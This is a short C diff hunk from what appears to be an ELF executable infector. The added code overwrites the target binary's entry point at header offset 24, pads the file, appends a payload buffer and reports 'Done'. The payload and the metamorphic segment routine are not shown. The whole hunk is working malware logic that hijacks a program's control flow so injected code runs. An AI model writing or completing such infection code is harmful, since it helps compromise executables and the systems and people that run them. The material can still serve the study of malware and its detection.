@@ -34,11 +34,17 @@ int inject(t_data data)
 {
 	u64 offset;
 	data.bin = get_infos(data.fd);
-	metamorph_segment(data);
-	offset = LSEEK(data.fd, 0, SEEK_END);
+	if (!metamorph_segment(data))
+		return (0);
+	/* change entry point */
+	LSEEK(data.fd, 24, SEEK_SET);
+	WRITE(data.fd, &(data.bin.new_entry), sizeof(data.bin.new_entry));
 	/* align */
-//	WRITE(1, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
-	
-	// memcpy
+	offset = LSEEK(data.fd, 0, SEEK_END);
+	WRITE(data.fd, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
+	/* write to file */
+	WRITE(data.fd, &payload, data.infos.pl_size);
+	CLOSE(data.fd);
+	WRITE(1, "Done\n", 5);
 	return (1);
 }
